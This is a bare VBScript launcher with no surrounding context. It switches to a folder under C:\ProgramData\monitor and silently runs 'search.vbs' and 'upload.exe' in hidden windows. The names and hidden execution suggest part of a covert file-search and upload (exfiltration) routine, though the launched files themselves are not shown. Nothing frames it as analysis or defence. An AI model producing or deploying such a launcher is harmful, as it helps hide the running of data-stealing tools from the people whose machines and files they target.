set objshell=createobject("wscript.shell")

objshell.CurrentDirectory = "C:\ProgramData\monitor\"
objshell.run("search.vbs"),0

objshell.run("upload.exe"),0